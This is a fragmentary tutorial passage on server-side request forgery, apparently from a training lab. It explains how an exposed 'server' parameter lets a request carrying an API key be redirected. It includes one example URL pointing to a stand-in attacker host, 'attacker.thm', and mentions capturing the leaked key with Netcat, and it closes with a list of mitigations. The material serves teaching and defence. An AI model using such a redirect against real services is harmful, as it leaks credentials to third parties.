...
This is a really basic case of SSRF. If this doesn't look that scary, SSRF can actually be used to do much more. In general, depending on the specifics of each scenario, SSRF can be used for:
    ...
    User → Web Application → SMS Provider (with API key) → Message Sent

---

## The Vulnerability
If the web application **exposes the `server` parameter** to users, attackers can manipulate it.  

For example:
https://www.mysite.com/sms?server=attacker.thm&msg=ABC

Instead of sending the SMS to the **real SMS provider**, the web application will forward the request (including the **API key**) to the attacker’s server:
...
The attacker could use **Netcat** to capture the request:
...
Discover internal IP addresses and open ports.

Abuse Trust Relationships

Access otherwise restricted services within the internal network.
...
Control outbound requests from your server.

Steal sensitive tokens (like API keys).

Exploit internal network trust.

Potentially escalate into RCE.

Mitigations include:

Validating and sanitizing user input.

Avoid exposing sensitive parameters like server.

Restrict outbound requests using firewall rules and allowlists.
---